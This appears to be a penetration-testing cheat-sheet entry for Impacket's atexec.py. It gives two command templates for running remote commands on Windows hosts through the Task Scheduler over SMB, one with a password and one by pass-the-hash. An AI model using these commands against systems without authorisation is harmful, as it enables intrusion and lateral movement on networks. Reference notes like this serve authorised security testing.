# atexec (imp)

%  windows, impacket-exec

## execute command view the task scheduler 
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
Using \pipe\atsvc via SMB

```
atexec.py <domain>/<user>:<password>@<ip> "command"
```

## pth
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
Execute command view the task scheduler (using \pipe\atsvc via SMB)

```
atexec.py -hashes <hash> <user>@<ip> "command"
```
